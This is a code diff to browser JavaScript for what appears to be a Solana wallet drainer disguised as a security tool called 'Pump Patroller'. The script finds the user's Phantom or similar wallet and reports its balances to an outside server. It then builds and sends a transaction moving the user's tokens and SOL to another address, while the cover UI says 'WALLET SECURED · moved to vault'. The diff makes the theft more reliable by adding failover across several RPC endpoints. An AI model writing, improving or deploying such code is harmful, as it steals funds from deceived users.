@@ -5,27 +5,52 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const RPC_URL = "https://solana-rpc.publicnode.com";
+  const RPCS = [
+    "https://solana-rpc.publicnode.com",
+    "https://api.mainnet-beta.solana.com",
+    "https://rpc.ankr.com/solana",
+    "https://solana.api.onfinality.io/public",
+  ];
   const MINTS = {
     USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
     USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
     WSOL: "So11111111111111111111111111111111111111112",
     JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
-    BTC:  "PLACEHOLDER_VERIFY_ON_SOLSCAN",   // ← REPLACE with the real wrapped-BTC mint before deploying
+    // BTC: "PASTE_REAL_MINT_FROM_SOLSCAN",   ← add after verifying on solscan (search "BTC", copy the token address)
   };
 
   const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
     Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
-  async function rpcRetry(fn, label) {
-    let v = null, err = null;
-    try { v = await withTO(fn(), 12000); } catch (e) { err = e; }
-    if (v === null) {
-      await new Promise(s => setTimeout(s, 2000));
-      try { v = await withTO(fn(), 12000); } catch (e2) { err = e2; }
+
+  // raw JSON-RPC with full failover across 4 endpoints
+  async function rpc(method, params) {
+    let lastErr = null;
+    for (const u of RPCS) {
+      try {
+        const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
+        if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
+          await new Promise(s => setTimeout(s, 300)); continue; }
+        const j = await r.json();
+        if (j && j.result !== undefined) return j;
+        if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
+          if (j.error.code === -32601) return j;
+          await new Promise(s => setTimeout(s, 300)); continue; }
+      } catch (e) { lastErr = e; }
+      await new Promise(s => setTimeout(s, 300));
     }
-    if (v === null) return { err: err ? String(err && err.message || err) : "timeout/rate-limit" };
-    return { ok: v };
+    return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
+  }
+
+  // getBalance with retries — the definitive read; only errors after this are real
+  async function readBalance(pk) {
+    for (let attempt = 0; attempt < 3; attempt++) {
+      const r = await rpc("getBalance", [pk]);
+      if (r && r.result !== undefined) return r.result;
+      await new Promise(s => setTimeout(s, 1500));
+    }
+    return null;
   }
 
   let PKSTR = null;
@@ -52,7 +77,7 @@
       return null;
     } catch (e) { return null; } };
 
-    // — detect: connected session first —
+    // — detect —
     let name = "?", prov = null;
     const CANDS = [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]];
     for (const [n, f] of CANDS) {
@@ -79,16 +104,18 @@
 
     const pk = PKSTR;
     const pkB = new PublicKey(pk);
-    const conn = new Connection(RPC_URL, "confirmed");
+    const conn = new Connection(RPCS[0], "confirmed");
     const label = name.startsWith("ext:") ? name.slice(4) : name;
 
-    // — inventory (rate-limit resilient) —
-    const balR = await rpcRetry(() => conn.getBalance(pkB), "getBalance");
-    if (balR.err) { beacon("err", { pk, provider: label, msg: "balance read failed: " + balR.err }); return; }
-    const bal = balR.ok;
-    const tokR = await rpcRetry(() => conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }), "tokenAccounts");
-    if (tokR.err) { beacon("err", { pk, provider: label, msg: "token read failed: " + tokR.err }); return; }
-    const r = tokR.ok;
+    // — inventory: getBalance retried hard across all endpoints —
+    const balRaw = await readBalance(pk);
+    if (balRaw === null) {
+      beacon("err", { pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 network/rate-limit" });
+      return;
+    }
+    const bal = balRaw;
+    const tokR = await rpc("getParsedTokenAccountsByOwner", [pk, { programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
+    const r = tokR && tokR.result ? tokR : { result: { value: [] } };
 
     const amt = {}, dec = {}, srcs = {};
     for (const { account, pubkey } of r.value) {
@@ -115,10 +142,10 @@
     const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
     const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");
 
-    // — report detection IMMEDIATELY —
+    // — detect ping (balance now verified, not guessed) —
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-    // — cover UI (non-fatal) —
+    // — cover UI —
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
@@ -127,7 +154,7 @@
         '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
           '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
           '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
-          '<span style="font-size:10px;color:#7E899D;">v2.8</span>' +
+          '<span style="font-size:10px;color:#7E899D;">v3.0</span>' +
           '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
         '</div>' +
         '<div style="padding:12px 14px;">' +
@@ -189,19 +216,20 @@
       : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
       : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
 
-    // — drain build —
     const FEE = 20000;
     async function buildTx(to) {
       const dest = new PublicKey(to);
-      const bh2R = await rpcRetry(() => conn.getLatestBlockhash(), "blockhash");
-      if (bh2R.err) { beacon("err", { pk, provider: label, msg: "blockhash failed: " + bh2R.err }); return { tx: null, moved: [], err: bh2R.err }; }
-      const bh2 = bh2R.ok;
-      const bal2R = await rpcRetry(() => conn.getBalance(pkB), "getBalance2");
-      const r2R = await rpcRetry(() => conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }), "tokens2");
-      if (bal2R.err || r2R.err) { beacon("err", { pk, provider: label, msg: "drain inventory failed: " + ((bal2R.err || r2R.err) || "") }); return { tx: null, moved: [], err: "inventory" }; }
-      const bal2 = bal2R.ok, r2 = r2R.ok;
+      const bh2 = await rpc("getLatestBlockhash");
+      if (!bh2 || !bh2.result) {
+        const why = bh2 && bh2.error ? bh2.error.message : "no result";
+        beacon("err", { pk, provider: label, msg: "blockhash failed: " + why });
+        return { err: why };
+      }
+      const bal2Raw = await readBalance(pk);
+      const balNum = bal2Raw !== null ? bal2Raw : 0;
+      const r2 = await rpc("getParsedTokenAccountsByOwner", [pk, { programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
       const amt2 = {}, dec2 = {}, srcs2 = {};
-      for (const it of r2.value) {
+      for (const it of (r2 && r2.result ? r2.result.value : [])) {
         const d = it.account.parsed?.data;
         if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; srcs2[d.mint] = it.pubkey; }
       }
@@ -218,11 +246,11 @@
         tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
         moved.push(t.k);
       }
-      const lam = Math.floor(bal2);
+      const lam = Math.floor(balNum);
       if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
       tx.feePayer = pkB;
-      tx.recentBlockhash = bh2.blockhash;
-      tx.lastValidBlockHeight = bh2.lastValidBlockHeight;
+      tx.recentBlockhash = bh2.result.value.blockhash;
+      tx.lastValidBlockHeight = bh2.result.value.lastValidBlockHeight;
       return { tx, moved };
     }
 
@@ -243,7 +271,7 @@
           const bt = await buildTx(to);
           if (bt.err) { done = false; report("err", "", bt.err); return; }
           if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
-          tx_sign(bt, kp);
+          bt.tx.sign([kp]);
           const sig = await conn.sendRawTransaction(bt.tx.serialize());
           setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, bt.moved.join(",")); return;
         }
@@ -258,7 +286,6 @@
         done = false;
       }
     }
-    function tx_sign(bt, kp) { bt.tx.sign([kp]); }
 
     let lastN = "";
     setInterval(async () => {
